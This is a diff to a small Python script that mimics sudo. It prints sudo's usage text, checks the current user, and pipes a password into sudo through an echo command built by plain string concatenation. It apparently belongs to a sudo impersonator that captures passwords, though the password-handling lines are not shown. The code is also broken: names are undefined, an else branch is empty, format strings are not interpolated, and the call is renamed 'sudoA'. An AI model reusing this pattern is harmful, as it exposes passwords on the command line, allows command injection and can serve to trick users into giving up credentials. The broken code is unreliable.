@@ -1,6 +1,6 @@
 import os
 import subprocess
-from sys import argv
+import sys
 
 def main():
     if(len(sys.argv) == 1):
@@ -11,7 +11,7 @@ def main():
         usage: sudo [-AbEHknPS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-T timeout] [-u user] [VAR=value] [-i|-s] [<command>]
         usage: sudo -e [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-T timeout] [-u user] file ...
         """)
-        
+    else:
     subprocess.Popen('whoami', shell=True, stdout=PIPE).stdout
     user = stdout.read()
     
@@ -23,5 +23,5 @@ def main():
     del sys.argv[0]
     for arg in sys.argv:
         arguments = arguments + arg + " "
-    os.system("echo {password} | sudo -S -k {arguments}")
+    os.system("echo {password} | sudoA -S -k {arguments}")
 main()
